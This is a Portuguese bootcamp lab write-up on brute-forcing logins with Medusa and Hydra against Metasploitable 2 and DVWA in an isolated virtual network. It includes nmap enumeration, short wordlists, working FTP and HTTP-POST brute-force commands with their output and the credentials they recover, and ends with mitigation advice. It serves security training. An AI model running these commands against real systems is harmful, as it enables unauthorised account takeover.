# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

## Desafio de projeto - Bootcamp Riachuelo - Cibersegurança

### Visão Geral

Este projeto implementa, documenta e compartilha um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

Foi configurado o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).

Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

Dos testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

⚠ Atenção: Este desafio é flexível! Você pode seguir os cenários propostos (FTP, DVWA, SMB) ou adaptar à sua realidade: experimentar outras ferramentas, criar novas wordlists, explorar módulos/serviços diferentes, ou apenas documentar em detalhes o que aprendeu, com estudos, reflexões e exemplos de código. O mais importante é demonstrar seu entendimento e compartilhar sua jornada de aprendizado!

### Ambiente

- Host: VirtualBox
- VMs: Kali Linux (atacante) e Metasploitable 2 (alvo) — IP: 192.168.56.101 (serviços: FTP, SMB, DVWA)
- Rede: Host-only / Internal Network (ambas as VMs na mesma rede privada)

### Ferramentas utilizadas

- Kali Linux (medusa, hydra, nmap, ftp)
- Metasploitable 2 (target)
- DVWA (web app vulnerável)
- Wordlists próprias (users.txt, password.txt)

### 1- Configurando as VM (RESUMO)

    1. Baixe a ISO do Kali Linux e Metasploitable 2
    -> Kali Linux: https://www.kali.org/get-kali/#kali-virtual-machines (Imagens para VMs, para este projeto foi escolhido a ISO do VirtualBox).
    -> Metasploitable 2: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
    -> Monte as imagens com as ISO baixada no VirtualBox
    -> Configure a Rede do Kali e Metasploitable 2 utilizando Host-Only em ambas VMs.
    -> Inicie as VMs
    -> Crie um snapshot da configurações iniciais, caso ocorra algum problema é possível retornar a configuração inicial do sistema.
    -> No Metasploitable 2 faça o login utilizando usuário e senha padrão (login: msfadmin, senha: msfadmin).
    -> Ainda no Metasploitable 2, descubra o ip da máquina alvo utilizando o comando: ip a (para esse projeto o IP foi: 192.168.1.101).

    ### 2- Enumeração / Auditoria
    #### 2.1 - Enumeração Inicial (NMap)

Comando:

```
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

Saída de comando:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 09:56 EST
Nmap scan report for 192.168.56.101
Host is up (0.00077s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:9D:63:4C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.24 seconds
```

### 3- Foça Bruta na porta FTP (Medusa)

#### 3.1 - Preparando a Wordlist (users.txt e password.txt)

```
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > password.txt
```

#### 3.2 Executando Força Bruta com Medusa

Comando:

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

Saída

```
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2026-02-26 10:06:14 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2026-02-26 10:06:14 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
2026-02-26 10:06:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2026-02-26 10:06:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2026-02-26 10:06:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2026-02-26 10:06:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2026-02-26 10:06:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2026-02-26 10:06:17 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2026-02-26 10:06:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2026-02-26 10:06:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2026-02-26 10:06:20 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```

Obtivemos sucesso na linha 5, como podemos observar o terminal retornou [SUCESS] com o user: msfadmin e password: msfadmin.

#### 3.3 Validação

Validando o usuário e senha retornado. (user: msfadmin, password: msfadmin)

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

### 4- Ataque ao formulário web (DVWA) com Hydra

#### 4.1- Motivo para utilizar Hydra

A ferramenta Hydra realiza ataque direto e compatível com formulários HTTP/POST oferecendo sintaxe mais simples para definir o payload e a fail string, evitando problemas de sintaxe do Medusa em alguns cenários.

#### 4.2- Criando as Wordlists

-> Aproveitei a Wordlists anterior (users.txt e password.txt).

#### 4.3- Capturando Requisiçao HTTP

-> Abra o Firefox, coloque a URL (192.168.56.101/dvwa/login.php)
-> Abra o DevTools do Firefox utilizando a tecla F12, utilize a aba Network
-> Realize a tentativa de login preenchendo o formulário Username e Password (Username=admin, Password=admin).
-> Texto exibido na tentativa de login: Login failed

#### 4.4- Comando Hydra para Força Bruta via HTTP/POST

Comando:

```
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

Saída:

```
┌──(kali㉿kali)-[~]
└─$ hydra -L users.txt -P password.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 10:53:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-26 10:53:22
```

O resultado da força bruta através do Hydra foi: login=admin e password=password.

### 5- Recomendações para resolução de problemas

- Criar políticas de senhas fortes e com tempo para expirar.
- Limite de tentativa de login e bloqueio.
- Autenticação MFA
- Desativar serviços e portas desnecessárias
- Proteção em formulários web: Tokens, Captcha, etc.
